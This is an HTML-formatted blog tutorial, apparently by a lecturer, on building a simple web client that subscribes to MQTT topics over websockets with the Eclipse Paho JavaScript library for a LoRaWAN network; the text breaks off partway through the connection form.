&lt;p&gt;MQTT is used by &lt;a href=&quot;https://www.thethingsnetwork.org/docs/applications/mqtt/&quot;&gt;The Things Network&lt;/a&gt;, who are building a global IoT network using LoRaWAN. In my job as a lecturer, I am supervising a group of students who are building an open LoRaWAN network in Dunedin City. In this project, we have implemented the open source &lt;a href=&quot;https://www.loraserver.io/&quot;&gt;LoRa Server&lt;/a&gt;, which also uses MQTT to &lt;a href=&quot;https://www.loraserver.io/lora-app-server/integrate/sending-receiving/mqtt/&quot;&gt;publish and subscribe to IoT data&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;To first understand what MQTT is used for, it is prudent to understand a typical IoT/LoRaWAN network. There are several components in a network:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;A node device: a small embedded device with a sensor (e.g., temperature sensor) which sends data using a LoRaWAN wireless chip&lt;/li&gt;
&lt;li&gt;A gateway device: similar to a WiFi access point which forwards data from nodes to a specific destination, usually a server&lt;/li&gt;
&lt;li&gt;A network server: a computer that manages devices (gateways and nodes) and processes data sent from devices (nodes)&lt;/li&gt;
&lt;li&gt;An application: a solution the end-user has to display data&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;I like to be explained things in layman terms. When I first witnessed MQTT I didn’t really understand how the technology worked, or how it was used. The technical jargon was intimidating! The important use of MQTT for clients is in the subscription of MQTT data from a server. For example, create a web application or mobile application that retrieves and displays node data. But how does it get the data? Answer: it subscribes to an MQTT topic that the server publishes. &lt;/p&gt;
&lt;p&gt;I like to explain the MQTT protocol similar to FM radio. A client is similar to the radio you have in your car. It can tune frequencies to listen to specific radio stations. The IoT equivalent is a subscription to an MQTT topic, where you must tune to the MQTT server. The key aspect, MQTT publications are live - the same way the radio station is live. If you want to save the music that a radio station is playing, you must record it. MQTT subscription is the same! &lt;/p&gt;
&lt;p&gt;This post covers how to write a simple MQTT subscription client for an IoT/LoRaWAN network. In this tutorial, the client will be a web application (usable on any modern web browser) that is written in HTML and JavaScript. The web application will subscribe to an MQTT topic from a server and print the information to the web page.&lt;/p&gt;
&lt;h2 id=&quot;the-eclipse-paho-mqtt-javascript-library&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#the-eclipse-paho-mqtt-javascript-library&quot; aria-label=&quot;the eclipse paho mqtt javascript library permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;The Eclipse Paho MQTT JavaScript Library&lt;/h2&gt;
&lt;p&gt;The first thing we need is an MQTT library to build our client. Writing an MQTT client is greatly simplified by using a well-documented and thoroughly tested library. I mean, why re-invent the wheel, when a group of talented developers have already designed an excellent wheel!&lt;/p&gt;
&lt;p&gt;The &lt;a href=&quot;https://www.eclipse.org/paho/&quot;&gt;Eclipse Paho project&lt;/a&gt; is an excellent open source MQTT client that is available for a variety of programming languages, including JavaScript. The &lt;a href=&quot;https://www.eclipse.org/paho/downloads.php&quot;&gt;Eclipse Paho Downloads&lt;/a&gt; page provides a summary of the support for different programming languages and the functionality provided in each. The &lt;a href=&quot;https://github.com/eclipse/paho.mqtt.javascript&quot;&gt;Eclipse Paho JavaScript client GitHub&lt;/a&gt; page has some good documentation on getting started using the library. However, in this post, we will cover each step and explain it along the way.&lt;/p&gt;
&lt;h2 id=&quot;mqtt-over-websockets&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#mqtt-over-websockets&quot; aria-label=&quot;mqtt over websockets permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;MQTT Over Websockets&lt;/h2&gt;
&lt;p&gt;In order to connect and subscribe to MQTT using JavaScript from within a web browser, MQTT must be configured to operate over web sockets. This is not implemented by default in most MQTT brokers; for example, Mosquitto does not enable web sockets by default. Make sure the MQTT broker you are attempting to connect to using this tutorial has web sockets enabled and that you have the correct web socket port.&lt;/p&gt;
&lt;h2 id=&quot;building-an-mqtt-web-application&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#building-an-mqtt-web-application&quot; aria-label=&quot;building an mqtt web application permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Building an MQTT Web Application&lt;/h2&gt;
&lt;h4 id=&quot;create-a-folder-structure&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#create-a-folder-structure&quot; aria-label=&quot;create a folder structure permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Create a folder structure&lt;/h4&gt;
&lt;p&gt;First, create a folder to house the web application. I have just created a folder on my desktop named: &lt;code class=&quot;language-text&quot;&gt;mqtt-demo&lt;/code&gt;. Inside that folder I have created a selection of files required for this project:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code class=&quot;language-text&quot;&gt;demo.html&lt;/code&gt;: A HTML file containing the web page content and structure&lt;/li&gt;
&lt;li&gt;&lt;code class=&quot;language-text&quot;&gt;demo.js&lt;/code&gt;: A JavaScript source file where will put the MQTT subscription code&lt;/li&gt;
&lt;li&gt;&lt;code class=&quot;language-text&quot;&gt;style.css&lt;/code&gt;: A CSS style sheet to enhance the design on the web page&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&quot;creating-the-html-page&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#creating-the-html-page&quot; aria-label=&quot;creating the html page permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Creating the HTML Page&lt;/h2&gt;
&lt;h4 id=&quot;html-creating-a-simple-skeleton&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#html-creating-a-simple-skeleton&quot; aria-label=&quot;html creating a simple skeleton permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;HTML: Creating a simple skeleton&lt;/h4&gt;
&lt;p&gt;To start we should create a simple skeleton HTML document. The structure is very simple. The &lt;code class=&quot;language-text&quot;&gt;&amp;lt;head&gt;&lt;/code&gt; element contains a title for the web page. The &lt;code class=&quot;language-text&quot;&gt;&amp;lt;body&gt;&lt;/code&gt; element contains two &lt;code class=&quot;language-text&quot;&gt;&amp;lt;div&gt;&lt;/code&gt; elements, one name &lt;em&gt;wrapper&lt;/em&gt; and one named &lt;em&gt;messages&lt;/em&gt;. The wrapper contains all the content on the page, while the messages will display the MQTT messages received.&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;html&quot;&gt;&lt;pre class=&quot;language-html&quot;&gt;&lt;code class=&quot;language-html&quot;&gt;&lt;span class=&quot;token doctype&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;!&lt;/span&gt;&lt;span class=&quot;token doctype-tag&quot;&gt;DOCTYPE&lt;/span&gt; &lt;span class=&quot;token name&quot;&gt;html&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;&lt;/span&gt;html&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;
   &lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;&lt;/span&gt;head&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;
      &lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;&lt;/span&gt;meta&lt;/span&gt; &lt;span class=&quot;token attr-name&quot;&gt;charset&lt;/span&gt;&lt;span class=&quot;token attr-value&quot;&gt;&lt;span class=&quot;token punctuation attr-equals&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&quot;&lt;/span&gt;utf-8&lt;span class=&quot;token punctuation&quot;&gt;&quot;&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;
      &lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;&lt;/span&gt;title&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;mqtt-demo: A simple web application that can subscribe to topics from an MQTT broker over websockets&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;/&lt;/span&gt;title&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;
   &lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;/&lt;/span&gt;head&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;
   &lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;&lt;/span&gt;body&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;
      &lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;&lt;/span&gt;div&lt;/span&gt; &lt;span class=&quot;token attr-name&quot;&gt;class&lt;/span&gt;&lt;span class=&quot;token attr-value&quot;&gt;&lt;span class=&quot;token punctuation attr-equals&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&quot;&lt;/span&gt;wrapper&lt;span class=&quot;token punctuation&quot;&gt;&quot;&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;
         &lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;&lt;/span&gt;h1&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;mqtt-demo&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;/&lt;/span&gt;h1&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;
         &lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;&lt;/span&gt;h2&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;A simple web application that can subscribe to topics from an MQTT broker over websockets&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;/&lt;/span&gt;h2&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;
         &lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;&lt;/span&gt;div&lt;/span&gt; &lt;span class=&quot;token attr-name&quot;&gt;id&lt;/span&gt;&lt;span class=&quot;token attr-value&quot;&gt;&lt;span class=&quot;token punctuation attr-equals&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&quot;&lt;/span&gt;messages&lt;span class=&quot;token punctuation&quot;&gt;&quot;&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;
         &lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;/&lt;/span&gt;div&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;
      &lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;/&lt;/span&gt;div&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;
   &lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;/&lt;/span&gt;body&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;/&lt;/span&gt;html&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;h4 id=&quot;html-adding-the-required-libraries-and-external-files&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#html-adding-the-required-libraries-and-external-files&quot; aria-label=&quot;html adding the required libraries and external files permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;HTML: Adding the required libraries and external files&lt;/h4&gt;
&lt;p&gt;In order to achieve a functioning web application, we must add a variety of libraries and external files to the HTML source code. Firstly, we should add the style sheet named &lt;code class=&quot;language-text&quot;&gt;style.css&lt;/code&gt;. Secondly, we must have the Paho JavaScript MQTT library, a &lt;code class=&quot;language-text&quot;&gt;.js&lt;/code&gt; file that will provide MQTT subscription functionality. This file is retrieved from &lt;a href=&quot;https://cdnjs.com/&quot;&gt;CDNJS&lt;/a&gt;. Thirdly, we need to add the &lt;code class=&quot;language-text&quot;&gt;demo.js&lt;/code&gt; file that we just created. This file will host our code to connect to the MQTT broker. &lt;/p&gt;
&lt;p&gt;The final header should look like the code snippet below:&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;html&quot;&gt;&lt;pre class=&quot;language-html&quot;&gt;&lt;code class=&quot;language-html&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;&lt;/span&gt;head&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;
  &lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;&lt;/span&gt;meta&lt;/span&gt; &lt;span class=&quot;token attr-name&quot;&gt;charset&lt;/span&gt;&lt;span class=&quot;token attr-value&quot;&gt;&lt;span class=&quot;token punctuation attr-equals&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&quot;&lt;/span&gt;utf-8&lt;span class=&quot;token punctuation&quot;&gt;&quot;&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;
  &lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;&lt;/span&gt;title&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;mqtt-demo: A simple web application that can subscribe to topics from an MQTT broker over websockets&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;/&lt;/span&gt;title&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;
  &lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;&lt;/span&gt;link&lt;/span&gt; &lt;span class=&quot;token attr-name&quot;&gt;rel&lt;/span&gt;&lt;span class=&quot;token attr-value&quot;&gt;&lt;span class=&quot;token punctuation attr-equals&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&quot;&lt;/span&gt;stylesheet&lt;span class=&quot;token punctuation&quot;&gt;&quot;&lt;/span&gt;&lt;/span&gt; &lt;span class=&quot;token attr-name&quot;&gt;href&lt;/span&gt;&lt;span class=&quot;token attr-value&quot;&gt;&lt;span class=&quot;token punctuation attr-equals&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&quot;&lt;/span&gt;style.css&lt;span class=&quot;token punctuation&quot;&gt;&quot;&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;
  &lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;&lt;/span&gt;script&lt;/span&gt; &lt;span class=&quot;token attr-name&quot;&gt;src&lt;/span&gt;&lt;span class=&quot;token attr-value&quot;&gt;&lt;span class=&quot;token punctuation attr-equals&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&quot;&lt;/span&gt;https://cdnjs.cloudflare.com/ajax/libs/paho-mqtt/1.0.2/mqttws31.min.js&lt;span class=&quot;token punctuation&quot;&gt;&quot;&lt;/span&gt;&lt;/span&gt; &lt;span class=&quot;token attr-name&quot;&gt;type&lt;/span&gt;&lt;span class=&quot;token attr-value&quot;&gt;&lt;span class=&quot;token punctuation attr-equals&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&quot;&lt;/span&gt;text/javascript&lt;span class=&quot;token punctuation&quot;&gt;&quot;&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token script&quot;&gt;&lt;/span&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;/&lt;/span&gt;script&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;
  &lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;&lt;/span&gt;script&lt;/span&gt; &lt;span class=&quot;token attr-name&quot;&gt;src&lt;/span&gt;&lt;span class=&quot;token attr-value&quot;&gt;&lt;span class=&quot;token punctuation attr-equals&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&quot;&lt;/span&gt;demo.js&lt;span class=&quot;token punctuation&quot;&gt;&quot;&lt;/span&gt;&lt;/span&gt; &lt;span class=&quot;token attr-name&quot;&gt;type&lt;/span&gt;&lt;span class=&quot;token attr-value&quot;&gt;&lt;span class=&quot;token punctuation attr-equals&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&quot;&lt;/span&gt;text/javascript&lt;span class=&quot;token punctuation&quot;&gt;&quot;&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token script&quot;&gt;&lt;/span&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;/&lt;/span&gt;script&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;/&lt;/span&gt;head&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;h4 id=&quot;html-adding-a-simple-html-form-to-get-mqtt-broker-information&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#html-adding-a-simple-html-form-to-get-mqtt-broker-information&quot; aria-label=&quot;html adding a simple html form to get mqtt broker information permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;HTML: Adding a simple HTML form to get MQTT broker information&lt;/h4&gt;
&lt;p&gt;Next, we will add a simple HTML form to allow input of essential MQTT configuration information. This form will have three boxes to enter in: 1) The hostname or IP address of the MQTT broker; 2) The port number for the MQTT broker; and 3) The topic to subscribe to. In addition, we are going to put in two buttons: 1) To connect to the server and subscribe to a topic; and 2) To disconnect from the server. &lt;/p&gt;
&lt;p&gt;Below is a simple form that will get the job done. Note how default values have been added with the &lt;code class=&quot;language-text&quot;&gt;value=&quot;property&quot;&lt;/code&gt; syntax. This information will display by default in the form, but can just be overwritten by new content. The current default values are set to the Mosquitto MQTT test server, which is excellent to test if the MQTT subscription is working. Also, note how the default topic is set to a hashtag symbol (&lt;code class=&quot;language-text&quot;&gt;#&lt;/code&gt;) - this is a wildcard and will subscribe to any topic provided by the MQTT broker.&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;html&quot;&gt;&lt;pre class=&quot;language-html&quot;&gt;&lt;code class=&quot;language-html&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;&lt;/span&gt;form&lt;/span&gt; &lt;span class=&quot;token attr-name&quot;&gt;id&lt;/span&gt;&lt;span class=&quot;token attr-value&quot;&gt;&lt;span class=&quot;token punctuation attr-equals&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&quot;&lt;/span&gt;connection-info-form&lt;span class=&quot;token punctuation&quot;&gt;&quot;&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;
  &lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;&lt;/span&gt;b&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;Hostname or IP Address:&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;/&lt;/span&gt;b&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt; 
